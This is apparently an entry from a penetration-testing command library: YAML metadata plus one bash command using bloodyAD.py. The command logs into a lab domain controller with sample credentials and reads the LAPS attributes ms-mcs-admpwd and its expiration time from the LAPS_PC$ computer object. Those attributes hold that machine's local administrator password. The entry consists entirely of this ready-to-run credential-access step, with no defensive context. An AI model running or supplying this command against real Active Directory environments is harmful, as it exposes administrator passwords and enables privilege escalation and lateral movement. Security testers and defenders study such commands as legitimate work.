---
id: 8a593891-4d38-4cee-a13e-fa19f4f90856
name: Get LAPS Password Attribute for LAPS_PC$ Object
type: command
executor: bash
data: bloodyAD.py -u john.doe -d bloody -p Password512 --host 192.168.10.2 getObjectAttributes
  LAPS_PC$ ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
output: null
created_at: '2023-04-06T03:56:06.929953+00:00'
updated_at: '2023-04-10T20:26:20.327039+00:00'
---

# Get LAPS Password Attribute for LAPS_PC$ Object

```bash
bloodyAD.py -u john.doe -d bloody -p Password512 --host 192.168.10.2 getObjectAttributes LAPS_PC$ ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```


